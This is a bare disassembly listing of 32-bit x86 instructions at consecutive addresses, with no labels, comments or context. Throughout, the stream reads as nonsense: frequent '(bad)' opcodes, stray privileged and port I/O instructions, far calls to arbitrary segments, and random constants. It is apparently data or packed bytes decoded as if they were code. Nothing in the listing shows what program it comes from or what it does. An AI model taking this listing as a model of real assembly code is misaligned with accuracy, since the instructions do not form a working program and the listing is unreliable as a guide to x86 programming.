  4066e8:	repnz mov esp,0x557f1d95
  4066ee:	sahf   
  4066ef:	arpl   WORD PTR [ebp+0x2d],di
  4066f2:	pop    esi
  4066f3:	pop    esi
  4066f4:	mov    bh,BYTE PTR [eax-0x57b09fc8]
  4066fa:	dec    edx
  4066fb:	mov    ecx,0xe98baa02
  406700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406701:	addr16 inc eax
  406703:	xchg   ebp,eax
  406704:	dec    ebp
  406705:	sub    ch,BYTE PTR [ebx]
  406707:	sar    DWORD PTR [ebp-0x5f],1
  40670a:	shr    DWORD PTR [eax-0x3d],cl
  40670d:	xor    edi,DWORD PTR [edx+0x78]
  406710:	mov    ss:0x595d72e,al
  406716:	imul   ebx,ecx,0x13dccdb7
  40671c:	repz pusha 
  40671e:	push   ecx
  40671f:	pop    ebx
  406720:	mov    eax,ds:0x8eb7da31
  406725:	and    ebp,ecx
  406727:	icebp  
  406728:	les    edi,FWORD PTR [edx*4+0x91918bb]
  40672f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406730:	sahf   
  406731:	pop    edx
  406732:	nop
  406733:	(bad)  
  406734:	push   cs
  406735:	push   ecx
  406736:	int    0x61
  406738:	std    
  406739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40673a:	lahf   
  40673b:	(bad)  
  40673c:	out    dx,eax
  40673d:	sub    DWORD PTR [ebp+0x5c],ebp
  406740:	in     al,0xb4
  406742:	(bad)  [edi]
  406744:	dec    ecx
  406745:	sahf   
  406746:	stos   DWORD PTR es:[edi],eax
  406747:	or     al,0x61
  406749:	pop    esi
  40674a:	mov    BYTE PTR [eax+0x21fbc3d4],dh
  406750:	hlt    
  406751:	jae    0x4067c3
  406753:	(bad)  
  406754:	rcr    ebx,cl
  406756:	mov    eax,0x1a74185c
  40675b:	(bad)  
  40675c:	je     0x40672a
  40675e:	sbb    esp,ebx
  406760:	(bad)  
  406761:	int    0x78
  406763:	fwait
  406764:	and    al,BYTE PTR [edx+0xa]
  406767:	adc    ebx,DWORD PTR [ebp+0x511a0023]
  40676d:	or     al,0x7f
  40676f:	or     DWORD PTR [ecx+edi*8],esp
  406772:	movd   esp,mm5
  406775:	(bad)  
  406776:	stc    
  406777:	mov    al,BYTE PTR [eax-0x61]
  40677a:	cmp    bl,BYTE PTR [eax+0x18431d81]
  406780:	mov    dl,0xcd
  406782:	push   eax
  406783:	in     al,0x9
  406785:	test   BYTE PTR [eax],ch
  406787:	or     al,0x35
  406789:	inc    BYTE PTR ds:0x823bf54e
  40678f:	shr    cl,cl
  406791:	sub    eax,0xdadf3924
  406796:	sbb    al,0x6d
  406798:	cs push esi
  40679a:	jb     0x40678d
  40679c:	loopne 0x4067c7
  40679e:	xor    DWORD PTR [ebx-0x2482d1ba],0x5a84d199
  4067a8:	dec    esi
  4067a9:	sbb    DWORD PTR [ecx-0x326a8d1b],0xdef866d1
  4067b3:	loope  0x406774
  4067b5:	dec    esp
  4067b6:	out    0xa3,al
  4067b8:	mov    edi,0x58c1da77
  4067bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067bf:	(bad)  
  4067c0:	loop   0x4067f8
  4067c2:	in     al,0x19
  4067c4:	push   esi
  4067c5:	(bad)  
  4067c6:	dec    esi
  4067c8:	mov    DWORD PTR [ecx],ecx
  4067ca:	out    0xa7,al
  4067cc:	outs   dx,BYTE PTR ds:[esi]
  4067cd:	pop    edi
  4067ce:	or     dl,BYTE PTR [edi+0x556dab73]
  4067d4:	popa   
  4067d5:	push   edi
  4067d6:	push   0x202791ed
  4067db:	jecxz  0x406806
  4067dd:	dec    esp
  4067de:	(bad)  
  4067df:	xchg   esi,eax
  4067e0:	data16 and dl,BYTE PTR [ebx]
  4067e3:	mov    al,ds:0xfd4015f5
  4067e8:	add    cl,dh
  4067ea:	test   al,0x36
  4067ec:	ins    DWORD PTR es:[edi],dx
  4067ed:	(bad)  
  4067ee:	int    0x47
  4067f0:	or     BYTE PTR [ecx],0xc3
  4067f3:	xor    eax,0x87ae9699
  4067f8:	cmc    
  4067f9:	rcr    DWORD PTR [esi+0x7ec106da],1
  4067ff:	ja     0x406862
  406801:	imul   BYTE PTR [edi-0x80]
  406804:	dec    ebx
  406805:	popa   
  406806:	test   eax,0xd264d9d3
  40680b:	adc    BYTE PTR [edi+edx*4-0x760f261b],bl
  406812:	jo     0x4067ba
  406814:	sbb    al,0x2e
  406816:	bound  eax,QWORD PTR [ebp+0x10b1d57b]
  40681c:	cs inc ecx
  40681e:	or     esp,DWORD PTR [esi+0x1f64c30e]
  406824:	bound  esp,QWORD PTR [eax+0x1cdcbc7e]
  40682a:	retf   0xbb77
  40682d:	sbb    bh,BYTE PTR [esp+esi*8+0x70]
  406831:	fs out dx,eax
  406833:	icebp  
  406834:	sub    al,0xd9
  406836:	push   edi
  406837:	push   ecx
  406838:	jno    0x40686b
  40683a:	mov    edi,0xd9b6846f
  40683f:	bound  esi,QWORD PTR [edx]
  406841:	dec    ebp
  406842:	into   
  406843:	lea    esp,[ebp+0x20]
  406846:	xchg   DWORD PTR ds:0x376d1345,edx
  40684c:	xchg   DWORD PTR ds:0xcfeeb752,ecx
  406852:	out    dx,eax
  406853:	mov    bh,0x54
  406855:	popa   
  406856:	stc    
  406857:	fmul   QWORD PTR [esi-0x71]
  40685a:	xor    dh,bl
  40685c:	vprorvd zmm6{k1},zmm1,ZMMWORD PTR [edx+esi*1]
  406863:	sub    edx,0x4c
  406866:	xchg   DWORD PTR [eax-0x77],esp
  406869:	(bad)  
  40686a:	and    eax,0x56121619
  40686f:	xchg   BYTE PTR [edx+ebx*2],dh
  406872:	pop    ebp
  406873:	sbb    DWORD PTR [edx-0x157ab018],eax
  406879:	mov    edx,0x3ce8d0d
  40687e:	mov    cl,0x82
  406880:	scas   eax,DWORD PTR es:[edi]
  406881:	adc    al,0xc4
  406883:	adc    BYTE PTR [edi+esi*2],ch
  406886:	inc    edi
  406887:	xchg   DWORD PTR [ecx+0x225b7f2c],esi
  40688d:	inc    eax
  40688e:	out    dx,al
  40688f:	jl     0x40686a
  406891:	jmp    0xff3d:0x1a59aec2
  406898:	cs sub eax,0xaefd4e11
  40689e:	iret   
  40689f:	pop    esi
  4068a0:	push   eax
  4068a1:	mov    ah,0x5
  4068a3:	dec    edi
  4068a4:	popa   
  4068a5:	aad    0xf0
  4068a7:	jae    0x4068d7
  4068a9:	adc    DWORD PTR [edx+0x14],0xfffffff9
  4068ad:	jge    0x4068aa
  4068af:	aad    0x76
  4068b1:	and    BYTE PTR [ebp+0x44b56dc5],cl
  4068b7:	mov    eax,ds:0x6e32d96
  4068bc:	mov    ebp,0xfdb9cb8
  4068c1:	xchg   esi,eax
  4068c2:	out    dx,al
  4068c3:	lods   al,BYTE PTR ds:[esi]
  4068c4:	xchg   edx,eax
  4068c5:	ja     0x4068ad
  4068c7:	push   esi
  4068c8:	inc    eax
  4068c9:	dec    DWORD PTR [ebp-0xc]
  4068cc:	sub    al,0xc0
  4068ce:	and    BYTE PTR [ebp+0x2e],0x5e
  4068d2:	imul   esi,esi,0xffffffe8
  4068d5:	popa   
  4068d6:	dec    eax
  4068d7:	sbb    al,0x68
  4068d9:	pop    esi
  4068da:	cmc    
  4068db:	fcmovne st,st(2)
  4068dd:	rcr    DWORD PTR [edi],cl
  4068df:	lods   eax,DWORD PTR ds:[esi]
  4068e0:	mov    edx,0x77e8eaa3
  4068e5:	inc    ebp
  4068e6:	xor    eax,0xe8572255
  4068eb:	jl     0x4068df
  4068ed:	push   ss
  4068ee:	or     edx,esp
  4068f0:	stc    
  4068f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068f2:	dec    esp
  4068f3:	retf   
  4068f4:	cmp    BYTE PTR [ebx],al
  4068f6:	mov    DWORD PTR [ecx],ecx
  4068f8:	push   cs
  4068f9:	jae    0x406900
  4068fb:	xchg   esp,eax
  4068fc:	loope  0x4068e1
  4068fe:	and    DWORD PTR [eax],0x1e4a53af
  406904:	inc    ebx
  406905:	push   ebp
  406906:	or     esp,esi
  406908:	pushf  
  406909:	add    BYTE PTR [edi-0x42cce8fa],0x1c
  406910:	mov    ds:0x96a90daf,eax
  406915:	outs   dx,BYTE PTR ds:[esi]
  406916:	fnstenv [ebx-0x3e]
  406919:	fsub   DWORD PTR [edi]
  40691b:	div    DWORD PTR [ecx]
  40691d:	add    al,0xa9
  40691f:	cmp    edx,DWORD PTR [ebp-0x6423c13e]
  406925:	xchg   ecx,eax
  406926:	je     0x40695e
  406928:	ss xchg esp,eax
  40692a:	push   ss
  40692b:	scas   al,BYTE PTR es:[edi]
  40692c:	cld    
  40692d:	ret    0x1b37
  406930:	cmp    BYTE PTR [eax],cl
  406932:	ror    BYTE PTR [ebx+ebx*1],1
  406935:	test   al,0xad
  406937:	sbb    ebp,esi
  406939:	mov    ah,0x78
  40693b:	lds    ecx,FWORD PTR [eax+0x7009b9e6]
  406941:	hlt    
  406942:	cli    
  406943:	xor    DWORD PTR [ecx-0x66355e20],ebx
  406949:	mov    dl,0x41
  40694b:	call   0xad68:0x624059a4
  406952:	sbb    dl,bh
  406954:	mov    eax,ds:0x947ff0d8
  406959:	sahf   
  40695a:	sbb    bl,BYTE PTR [edx+0x24a8e4af]
  406960:	cmp    esp,DWORD PTR ds:0x2211c9df
  406966:	mov    ?,eax
  406968:	sub    cl,BYTE PTR [eax+0x71]
  40696b:	stc    
  40696c:	dec    ebp
  40696d:	cs rdmsr 
  406970:	dec    ebx
  406971:	cmp    eax,DWORD PTR [esi]
  406973:	in     al,dx
  406974:	cmp    DWORD PTR cs:[ebx],esi
  406977:	pop    edx
  406978:	xchg   esp,eax
  406979:	jmp    0x4069bc
  40697b:	dec    eax
  40697c:	xchg   BYTE PTR [esi-0x7b],bh
  40697f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406980:	mov    cl,0x70
  406982:	cmp    eax,0x216734dc
  406987:	lahf   
  406988:	cmp    al,0xb6
  40698a:	repnz add DWORD PTR [esi],edi
  40698d:	neg    DWORD PTR [ebx-0x26adeff0]
  406993:	sub    ch,BYTE PTR [edi+0x70]
  406996:	inc    esp
  406997:	jecxz  0x4069ba
  406999:	adc    DWORD PTR [edi+0x7333bf3a],ecx
  40699f:	cmp    al,0x81
  4069a1:	out    0x69,al
  4069a3:	(bad)  
  4069a4:	test   DWORD PTR [ecx],0x33b4a7d8
  4069aa:	pop    ecx
  4069ab:	mov    ecx,0x731ddbf2
  4069b0:	inc    ecx
  4069b1:	sbb    al,0xe6
  4069b3:	mov    ds:0x583f81a6,eax
  4069b8:	dec    ebp
  4069b9:	out    0x4e,eax
  4069bb:	daa    
  4069bc:	sbb    dh,bh
  4069be:	mov    al,ds:0x5097f96c
  4069c3:	pop    edi
  4069c4:	hlt    
  4069c5:	fwait
  4069c6:	push   0x58
  4069c8:	es mov bh,0xbe
  4069cb:	xchg   ebp,eax
  4069cc:	jnp    0x4069de
  4069ce:	es jg  0x406a1c
  4069d1:	cld    
  4069d2:	dec    esp
  4069d3:	ins    BYTE PTR es:[edi],dx
  4069d4:	in     al,0xae
  4069d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d7:	xchg   ebp,eax
  4069d8:	xor    al,0xcb
  4069da:	aaa    
  4069db:	loope  0x406a4b
  4069dd:	mov    WORD PTR [edx*1-0x40b07fe7],ds
  4069e4:	xchg   edx,eax
  4069e5:	cmp    BYTE PTR [ebx],0x3e
  4069e8:	inc    edx
  4069e9:	call   0xd93:0x18972be7
  4069f0:	or     DWORD PTR [ecx-0x41],0x66
  4069f4:	pop    ds
  4069f5:	dec    eax
  4069f6:	mov    ecx,0xd9741279
  4069fb:	(bad)  [ecx]
  4069fd:	push   eax
  4069fe:	pop    ds
  4069ff:	cmp    DWORD PTR [eax],edi
  406a01:	gs repnz ror al,1
  406a05:	in     eax,dx
  406a06:	push   ss
  406a07:	sbb    eax,0x9fc5792
  406a0c:	xchg   DWORD PTR [ecx+0x3e8d8702],edx
  406a12:	pushf  
  406a13:	outs   dx,BYTE PTR ds:[esi]
  406a14:	cs pop ecx
  406a16:	or     al,BYTE PTR [edi-0x3b]
  406a19:	xor    DWORD PTR [eax],0x5a43e1f0
  406a1f:	out    dx,al
  406a20:	aad    0x4f
  406a22:	and    BYTE PTR [eax-0x2f],dl
  406a25:	dec    edx
  406a26:	add    DWORD PTR [ebp+0x5],esp
  406a29:	sub    ecx,DWORD PTR [ebp+0x471a0f03]
  406a2f:	stos   BYTE PTR es:[edi],al
  406a30:	jge    0x406a43
  406a32:	fbld   TBYTE PTR [eax+ecx*1]
  406a35:	scas   eax,DWORD PTR es:[edi]
  406a36:	retf   0xa7db
  406a39:	das    
  406a3a:	(bad)  
  406a3b:	int3   
  406a3c:	mov    esi,0x81257134
  406a41:	jmp    0x4069d1
  406a43:	(bad)  
  406a45:	dec    esi
  406a46:	test   DWORD PTR [esi*1-0x41c7e011],esi
  406a4d:	sub    DWORD PTR [esi+ebp*8+0x4bfea725],esp
  406a54:	sub    esi,edx
  406a56:	xchg   BYTE PTR [ecx+0x681b5109],bl
  406a5c:	push   ecx
  406a5d:	xchg   edx,eax
  406a5e:	push   ecx
  406a5f:	adc    dl,BYTE PTR [ebp+0x24]
  406a62:	xor    eax,0xcfa2a92e
  406a67:	mov    edi,0x4cd3dbd9
  406a6c:	loop   0x406a67
  406a6e:	push   esi
  406a6f:	mov    ah,0x1
  406a71:	(bad)  
  406a72:	rol    dl,cl
  406a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a75:	xchg   ebx,eax
  406a76:	int3   
  406a77:	xchg   DWORD PTR [edi+esi*4+0x18c61053],esi
  406a7e:	shl    DWORD PTR [edx],cl
  406a80:	sub    al,0xf4
  406a82:	(bad)  
  406a83:	xor    dh,0xde
  406a86:	cmp    eax,ebp
  406a88:	clc    
  406a89:	xor    dl,BYTE PTR [ecx+0x2c5dd53a]
  406a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a90:	loopne 0x406aeb
  406a92:	add    eax,0x55e667a4
  406a97:	or     DWORD PTR [eax],edx
  406a99:	mov    al,BYTE PTR [edi+ebp*8+0x73]
  406a9d:	add    DWORD PTR [ebx-0x1a],edx
  406aa0:	jmp    0x406a86
  406aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa3:	mov    BYTE PTR [edi+0xf],cl
  406aa6:	aad    0xc7
  406aa8:	test   dl,bl
  406aaa:	sub    ecx,DWORD PTR [di]
  406aad:	and    ebp,DWORD PTR ds:0x7fb41e00
  406ab3:	sub    BYTE PTR [ebx-0x3b],cl
  406ab6:	imul   ecx,DWORD PTR [edi-0x42],0x23
  406aba:	push   ebp
  406abb:	push   esp
  406abc:	cmp    al,0x10
  406abe:	jmp    0x1258c28e
  406ac3:	ud1    edx,DWORD PTR [ebp+0x15e9180d]
  406aca:	fist   WORD PTR [ebx]
  406acc:	push   ebp
  406acd:	cmp    eax,0x66c47b8e
  406ad2:	in     eax,0x61
  406ad4:	call   0xb2a97909
  406ad9:	mov    edi,0xa7848b28
  406ade:	mov    WORD PTR [ebx-0x32d0d8],?
  406ae4:	scas   al,BYTE PTR es:[edi]
  406ae5:	xchg   DWORD PTR [ebp-0x91ae55a],edi
  406aeb:	leave  
  406aec:	test   DWORD PTR [esi+ebp*4],ecx
  406aef:	mov    dl,0xca
  406af1:	inc    sp
  406af3:	out    dx,eax
  406af4:	and    al,0x61
  406af6:	inc    edi
  406af7:	test   BYTE PTR [edi+0x62],ch
  406afa:	mov    eax,ds:0x7a12ed3f
  406aff:	inc    edi
  406b00:	ds inc edx
  406b02:	ins    DWORD PTR es:[edi],dx
  406b03:	dec    ecx
  406b04:	cmp    bh,ah
  406b06:	repnz sbb BYTE PTR [eax],0x45
  406b0a:	loope  0x406b48
  406b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b0d:	xor    BYTE PTR [esi],bh
  406b0f:	ins    DWORD PTR es:[edi],dx
  406b10:	jp     0x406af3
  406b12:	push   esi
  406b13:	xor    cl,al
  406b15:	sti    
  406b16:	jns    0x406b96
  406b18:	mov    esp,0xa8c59991
  406b1d:	ins    DWORD PTR es:[edi],dx
  406b1e:	add    eax,0xb614137c
  406b23:	mov    al,ds:0x64e84c40
  406b28:	retf   
  406b29:	test   eax,0xfbe5c910
  406b2e:	dec    eax
  406b2f:	xchg   edi,eax
  406b30:	mov    eax,0x681ee832
  406b35:	or     dh,BYTE PTR [edi+0x4d]
  406b38:	sbb    eax,0xf542d72
  406b3d:	or     esp,DWORD PTR [eax+0x330c3585]
  406b43:	push   ecx
  406b44:	push   es
  406b45:	cmc    
  406b46:	jbe    0x406b3f
  406b48:	icebp  
  406b49:	xor    eax,0xd37aaf44
  406b4e:	into   
  406b4f:	inc    esp
  406b50:	xor    eax,0x35819ff9
  406b55:	iret   
  406b56:	sub    dl,al
  406b58:	mov    dh,0x51
  406b5a:	loope  0x406bb6
  406b5c:	pop    ebp
  406b5d:	pop    ebx
  406b5e:	xor    bl,BYTE PTR [ebp-0x39338ac8]
  406b64:	push   ss
  406b65:	mov    al,ds:0x3a2d39c8
  406b6a:	mov    DWORD PTR [esi+0x2647f984],edx
  406b70:	pushf  
  406b71:	mov    esi,esi
  406b73:	dec    eax
  406b74:	add    eax,0xff434c30
  406b79:	xor    BYTE PTR [eax-0x700d15ed],cl
  406b7f:	mov    dl,0xea
  406b81:	call   0xdb4:0xd88ea66d
  406b88:	mov    ds:0x6a6fb887,eax
  406b8d:	ss scas al,BYTE PTR es:[edi]
  406b8f:	xor    DWORD PTR [ecx+0x3cd62900],eax
  406b95:	retf   
  406b96:	jg     0x406bd5
  406b98:	pop    ebp
  406b99:	adc    BYTE PTR [edx-0x437b368b],dl
  406b9f:	inc    DWORD PTR [ecx-0x77ae01aa]
  406ba5:	adc    eax,0x37d76679
  406baa:	push   ds
  406bab:	inc    ebx
  406bac:	and    esp,ebp
  406bae:	inc    edi
  406baf:	fldcw  WORD PTR [esi+0x77]
  406bb2:	jbe    0x406c05
  406bb4:	jne    0x406bd9
  406bb6:	shl    DWORD PTR [ebx+esi*1-0x32],cl
  406bba:	mov    ebp,DWORD PTR [ebx]
  406bbc:	push   ds
  406bbd:	xchg   edx,eax
  406bbe:	pop    ss
  406bbf:	mov    ds:0x77c7aafa,al
  406bc4:	clc    
  406bc5:	cmc    
  406bc6:	cdq    
  406bc7:	mov    edx,0x6083dae2
  406bcc:	pop    ecx
  406bcd:	test   DWORD PTR [esi+0x2aeb0452],0xecdd591a
  406bd7:	cmp    edi,DWORD PTR ds:0x634ae9f1
  406bdd:	xchg   esp,eax
  406bde:	lock and bl,bl
  406be1:	cwde   
  406be2:	add    eax,0x6300c0a
  406be7:	in     eax,0xc4
  406be9:	sub    BYTE PTR [edi+ebx*2],dh
  406bec:	call   0x4336b34d
  406bf1:	sbb    eax,0x7559b03c
  406bf6:	mov    ebp,0xc6cbbdf7
  406bfb:	jne    0x406c24
  406bfd:	adc    esp,edi
  406bff:	sub    ch,0x8e
  406c02:	ins    BYTE PTR es:[edi],dx
  406c03:	jecxz  0x406c5c
  406c05:	dec    edx
  406c06:	mov    eax,0xd9b55d55
  406c0b:	pop    ds
  406c0c:	arpl   WORD PTR [edx+0xaf5a72b],bx
  406c12:	aaa    
  406c13:	jno    0x406b95
  406c15:	lods   eax,DWORD PTR ds:[esi]
  406c16:	xor    BYTE PTR [edx-0x5a],al
  406c19:	int    0x6a
  406c1b:	int    0x69
  406c1d:	daa    
  406c1e:	cld    
  406c1f:	adc    edx,edi
  406c21:	shl    DWORD PTR ds:0x768b5290,0xb
  406c28:	verr   WORD PTR [ecx+0x77aadcdc]
  406c2f:	fld    DWORD PTR [ebx+eiz*4-0x328a5b24]
  406c36:	lahf   
  406c37:	dec    edi
  406c38:	lods   eax,DWORD PTR ds:[esi]
  406c39:	inc    eax
  406c3a:	rcr    DWORD PTR [ecx],1
  406c3c:	xor    al,0x21
  406c3e:	shr    DWORD PTR [eax+ebp*2+0x16984ffa],1
  406c45:	push   esp
  406c46:	xor    BYTE PTR [ecx-0x6b4a7a9c],dl
  406c4c:	imul   ecx,DWORD PTR [ecx+0xb6696d3],0xffffff91
  406c53:	jg     0x406c81
  406c55:	test   esp,ecx
  406c57:	pop    es
  406c58:	stc    
  406c59:	pushf  
  406c5a:	call   0x1819:0x6b822dfb
  406c61:	and    eax,DWORD PTR [esi+0x2e]
  406c64:	stc    
  406c65:	mov    ch,0x6b
  406c67:	fucomp st(7)
  406c69:	xchg   ebx,eax
  406c6a:	imul   edi,DWORD PTR [edi],0x4466d49d
  406c70:	pop    edi
  406c71:	sbb    BYTE PTR fs:[ebp+0x75],ch
  406c75:	aad    0xbe
  406c77:	xor    al,BYTE PTR [edi-0x532e7142]
  406c7d:	shl    BYTE PTR ds:0x7257fab,cl
  406c83:	sub    BYTE PTR ds:0x199cf7fe,ch
  406c89:	(bad)  
  406c8a:	leave  
  406c8b:	jl     0x406c46
  406c8d:	stos   BYTE PTR es:[edi],al
  406c8e:	cli    
  406c8f:	mov    cl,0xd7
  406c91:	sub    eax,0xf3800db8
  406c96:	stos   BYTE PTR es:[edi],al
  406c97:	rcr    BYTE PTR [edi-0x4e],cl
  406c9a:	into   
  406c9b:	cmc    
  406c9c:	sti    
  406c9d:	sti    
  406c9e:	sbb    DWORD PTR [esi+0x14],0x477534b
  406ca5:	cmc    
  406ca6:	stc    
  406ca7:	test   al,0x90
  406ca9:	daa    
  406caa:	sbb    eax,0x85161c4d
  406caf:	xor    bh,bl
  406cb1:	cmp    bl,BYTE PTR [edi-0x4b825baa]
  406cb7:	sub    DWORD PTR [eax-0x3c299f56],0x14cefa63
  406cc1:	add    al,0xbe
  406cc3:	call   0xebb086e3
  406cc8:	fadd   DWORD PTR [edi-0x5f]
  406ccb:	mov    ebx,0xcf3d9245
  406cd0:	adc    al,0x68
  406cd2:	fs stos DWORD PTR es:[edi],eax
  406cd4:	and    edi,DWORD PTR [ecx-0x4c47a6a4]
  406cda:	ja     0x406cf4
  406cdc:	pop    ax
  406cde:	and    esp,DWORD PTR [esi-0x53efa014]
  406ce4:	pop    ss
  406ce5:	pop    ds
  406ce6:	scas   eax,DWORD PTR es:[edi]
  406ce7:	mov    edx,0x24b93b60
  406cec:	ins    DWORD PTR es:[edi],dx
  406ced:	mov    eax,0xc3076eca
  406cf2:	rol    DWORD PTR [ebx-0xb],cl
  406cf5:	ins    DWORD PTR es:[edi],dx
  406cf6:	dec    eax
  406cf7:	cmp    DWORD PTR [eax],ebp
  406cf9:	popf   
  406cfa:	out    dx,eax
  406cfb:	lock xor ebp,ebx
  406cfe:	(bad)  
  406cff:	jge    0x406d4a
  406d01:	mov    ch,0xd5
  406d03:	mov    edi,0xb3b9ad6b
  406d08:	jg     0x406d1b
  406d0a:	fs sbb eax,0x3ff3bd38
  406d10:	xchg   edi,eax
  406d11:	and    dl,BYTE PTR [ecx]
  406d13:	outs   dx,DWORD PTR ds:[esi]
  406d14:	pop    edx
  406d15:	je     0x406d46
  406d17:	aas    
  406d18:	pop    ds
  406d19:	cmp    edi,0xd172c3c9
  406d1f:	push   0xd0438ed1
  406d24:	adc    esi,esi
  406d26:	sti    
  406d27:	sub    BYTE PTR [esi-0x1e96eaca],cl
  406d2d:	jns    0x406d00
  406d2f:	out    dx,al
  406d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d31:	daa    
  406d32:	cmp    BYTE PTR [edi+0x7a],dh
  406d35:	stc    
  406d36:	dec    ebx
  406d37:	inc    esp
  406d38:	test   al,0x52
  406d3a:	jecxz  0x406d33
  406d3c:	loopne 0x406d23
  406d3e:	inc    ebp
  406d3f:	jge    0x406db1
  406d41:	inc    ebp
  406d42:	stc    
  406d43:	adc    esp,DWORD PTR ss:[esi-0x5f]
  406d47:	ins    BYTE PTR es:[edi],dx
  406d48:	pop    esi
  406d49:	dec    edx
  406d4a:	retf   
  406d4b:	and    BYTE PTR [ebx+0x45],ah
  406d4e:	mov    eax,ds:0xe0ee3871
  406d53:	xchg   ebx,eax
  406d54:	jmp    0x52e63636
  406d59:	mov    DWORD PTR [eax+ebp*2],esp
  406d5c:	(bad)  
  406d5d:	mov    bl,0x7f
  406d5f:	mov    ch,al
  406d61:	inc    eax
  406d62:	in     eax,0x14
  406d64:	leave  
  406d65:	cmp    eax,0x38a94e72
  406d6a:	das    
  406d6b:	xchg   esp,eax
  406d6c:	and    DWORD PTR [edx-0x5f],edx
  406d6f:	enter  0x1c9,0xb4
  406d73:	out    dx,eax
  406d74:	rol    DWORD PTR [esi+ebp*4+0x7f],0x5
  406d79:	iret   
  406d7a:	loop   0x406df9
  406d7c:	aam    0x84
  406d7e:	jbe    0x406d9d
  406d80:	sbb    DWORD PTR [edi+ecx*8],edi
  406d83:	popa   
  406d84:	jno    0x406da8
  406d86:	popf   
  406d87:	das    
  406d88:	mov    ah,0xd7
  406d8a:	mov    eax,ds:0xc5ed5e95
  406d8f:	or     BYTE PTR [edx+0x51],bh
  406d92:	mov    ecx,0x81986966
  406d97:	mov    eax,0xe5b7154
  406d9c:	add    DWORD PTR [ebx-0x6e],ebp
  406d9f:	add    esp,DWORD PTR [ebp+0x1dcd3a42]
  406da5:	jecxz  0x406e10
  406da7:	pop    eax
  406da8:	sar    DWORD PTR [edi+edx*4-0x1b0130ec],cl
  406daf:	inc    ebx
  406db0:	mov    dh,0x1e
  406db2:	inc    edi
  406db3:	add    eax,0x28d106ac
  406db8:	adc    eax,0x3b4fa434
  406dbd:	push   edx
  406dbf:	lds    ecx,FWORD PTR [ecx+edi*8+0x3b7b6bb5]
  406dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc7:	cwde   
  406dc8:	in     eax,0x65
  406dca:	push   cs
  406dcb:	jbe    0x406da8
  406dcd:	inc    ebp
  406dce:	imul   ebp,DWORD PTR [ebx+0x51],0x51
  406dd2:	ins    BYTE PTR es:[edi],dx
  406dd3:	push   esi
  406dd4:	and    eax,0x81545593
  406dd9:	xor    BYTE PTR [edx+ebx*4-0x33667fe1],ah
  406de0:	push   0x986491f1
  406de5:	xchg   ebp,eax
  406de6:	(bad)  
  406de7:	mov    ds:0xab15148f,eax
  406dec:	push   ds
  406ded:	jno    0x406e42
  406def:	sub    al,0x6e
  406df1:	es std 
  406df3:	pop    edi
  406df4:	xchg   ebp,eax
  406df5:	sbb    DWORD PTR ds:0x30d46ab9,eax
  406dfb:	xor    al,BYTE PTR [esi-0x37790655]
  406e01:	pusha  
  406e02:	add    eax,0x5a2bc996
  406e07:	mov    eax,ds:0x30c2dc25
  406e0c:	popf   
  406e0d:	sub    dh,cl
  406e0f:	jge    0x406e73
  406e11:	fiadd  WORD PTR [eax+0x5e]
  406e14:	aad    0x5e
  406e16:	mov    bh,0x76
  406e18:	punpckhbw mm4,QWORD PTR [edi-0x5c1f64c1]
  406e1f:	mov    cl,0x41
  406e21:	mov    esi,0xcc41853
  406e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e28:	sahf   
  406e29:	xor    ebx,DWORD PTR [eax+esi*4-0x362c4ae9]
  406e30:	sbb    DWORD PTR [ebp-0x3c],ebx
  406e33:	pop    ecx
  406e34:	loop   0x406e42
  406e36:	popf   
  406e37:	sub    dl,BYTE PTR [edx+0x76]
  406e3a:	in     al,0xd5
  406e3c:	push   ss
  406e3d:	mov    WORD PTR [ebx-0x4bc95cb8],ss
  406e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e44:	ds ds dec edx
  406e47:	cmp    al,BYTE PTR [eax+0x34]
  406e4a:	into   
  406e4b:	push   esp
  406e4c:	loop   0x406e62
  406e4e:	add    DWORD PTR [ebx-0x3deb132f],0xdb67f8e0
  406e58:	imul   esp,DWORD PTR [ecx-0x4c],0x7943e9d3
  406e5f:	mov    al,0xc9
  406e61:	jecxz  0x406e20
  406e63:	xor    esp,edi
  406e65:	fist   WORD PTR [ebp-0x42]
  406e68:	push   edx
  406e69:	lds    edx,FWORD PTR [edx]
  406e6b:	outs   dx,DWORD PTR ds:[esi]
  406e6c:	sub    eax,0xd778a3f8
  406e71:	pop    ebp
  406e72:	jb     0x406eab
  406e74:	fsubr  QWORD PTR [edi-0x21b26a30]
  406e7a:	cs push edi
  406e7c:	in     eax,0xc3
  406e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7f:	dec    edx
  406e80:	stos   BYTE PTR es:[edi],al
  406e81:	loope  0x406efc
  406e83:	bound  edi,QWORD PTR [eax]
  406e85:	call   0x153bc74a
  406e8a:	add    bh,BYTE PTR [esi]
  406e8c:	sahf   
  406e8d:	pop    ds
  406e8e:	aaa    
  406e8f:	sbb    al,0x1
  406e91:	ins    BYTE PTR es:[edi],dx
  406e92:	jnp    0x406e72
  406e94:	jns    0x406ebe
  406e96:	retf   
  406e97:	xchg   edi,eax
  406e98:	adc    edi,edx
  406e9a:	es jnp 0x406e78
  406e9d:	fstp   DWORD PTR [ecx+edi*4]
  406ea0:	enter  0x4e6e,0x5e
  406ea4:	sti    
  406ea5:	inc    ebx
  406ea6:	inc    edi
  406ea7:	ins    DWORD PTR es:[edi],dx
  406ea8:	mov    edx,0x4c0ee7bd
  406ead:	int3   
  406eae:	push   eax
  406eaf:	push   0x19
  406eb1:	and    esi,esp
  406eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb4:	pop    ecx
  406eb5:	stc    
  406eb6:	xchg   esp,eax
  406eb7:	xor    DWORD PTR [esi],edi
  406eb9:	call   0xd2ee:0x178163f2
